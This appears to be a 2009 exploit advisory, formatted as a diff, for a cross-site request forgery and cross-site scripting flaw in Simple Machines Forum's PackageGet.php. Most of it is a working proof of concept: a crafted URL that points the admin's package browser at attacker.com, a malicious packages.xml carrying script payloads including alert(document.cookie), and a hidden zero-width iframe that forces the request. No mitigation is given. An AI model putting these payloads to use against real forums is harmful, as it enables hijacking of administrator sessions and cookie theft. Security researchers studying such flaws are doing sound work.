@@ -1,0 +1,44 @@
+Author: Xianur0
+Vulnerable Version: All
+
+The Bug is located in the file: Sources/PackageGet.php
+
+Example:
+http://victm.com/index.php?action=packageget;sa=browse;absolute=http://attacker.com
+
+When the admin link between the SMF to load the file:
+
+http://attacker.com/packages.xml
+
+Save this file as packages.xml
+
+<?xml version="1.0"?>
+<!DOCTYPE modification SYSTEM "http://www.simplemachines.org/xml/package-list">
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+XSRF SMF PoC By Xianur0
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<package-list xmlns="http://www.simplemachines.org/xml/package-list"
+xmlns:smf="http://www.simplemachines.org/">
+<list-title>Xianur0 Was Here</list-title>
+
+<section>
+    <title>SMF XSS PoC By Xianur0</title>
+    <text><![CDATA[<script>alert('XSS')</script>]]></text>
+    <modification>
+        <id>Xianur0:XSMF</id>
+        <name>SMF PoC By Xianur0</name>
+        <filename>smfexploit.zip</filename>
+        <version>0.1</version>
+        <author email="uxmal666@gmail.com">Xianur0</author>
+        <description><![CDATA[<script>alert(document.cookie)</script>]]></description>
+    </modification>
+</section>
+</package-list>
+
+and generate the XSRF:
+
+<iframe src ="http://victim.com/index.php?action=packageget;sa=browse;absolute=http://attacker.com"
+width="0%" scrolling=no width=0%></iframe>
+
+# milw0rm.com [2009-01-26]
